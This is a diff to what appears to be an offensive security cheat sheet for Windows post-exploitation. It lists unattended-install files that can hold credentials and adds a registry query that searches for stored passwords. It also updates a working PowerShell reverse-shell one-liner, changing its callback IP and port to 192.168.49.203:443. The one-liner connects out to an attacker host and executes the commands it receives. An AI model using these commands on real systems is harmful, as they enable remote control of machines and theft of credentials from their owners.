@@ -115,7 +115,7 @@
 
 `DRIVEQUERY`
 
-### Check these files.
+#### Check these files.
 
 c:\sysprep.inf
 
@@ -128,6 +128,10 @@ c:\unattend.xml
 %WINDIR%\Panther\Unattend\Unattended.xml
 
 %WINDIR%\Panther\Unattended.xml
+
+#### Search for Passwords
+
+`reg query HKLM /f pass /t REG_SZ /s`
 
 <!--
 ##################################################################
@@ -217,7 +221,7 @@ c:\unattend.xml
 #### Powershell Reverse Shell One Liner
 
 ```
-$client = New-Object System.Net.Sockets.TCPClient("192.168.25.31",7777);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+$client = New-Object System.Net.Sockets.TCPClient("192.168.49.203",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
 
 <!--
